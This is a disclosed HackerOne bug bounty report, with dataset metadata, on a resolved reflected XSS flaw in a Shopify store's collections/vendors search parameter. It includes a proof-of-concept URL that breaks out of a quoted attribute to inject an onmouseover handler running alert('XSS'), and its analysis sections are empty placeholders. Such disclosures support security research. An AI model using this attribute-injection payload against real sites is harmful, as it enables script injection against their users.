---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '324136'
original_report_id: '324136'
title: XSS *.myshopify.com/collections/vendors?q=
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: shopify
created_at: '2018-03-10T05:58:07.680Z'
disclosed_at: '2018-04-08T10:25:54.621Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 34
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS *.myshopify.com/collections/vendors?q=

## Metadata

- HackerOne Report ID: 324136
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: shopify
- Disclosed At: 2018-04-08T10:25:54.621Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

WAF cut "<",">, but " and ' still in.
1. 
[PoC example link](https://lostvalues.myshopify.com/collections/vendors?q=X" onmouseover="alert('XSS')" style="font-size: 1001pt;") 
2.mouse on X
3. ..
4.XSS alert message

## Impact

XSS atack

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
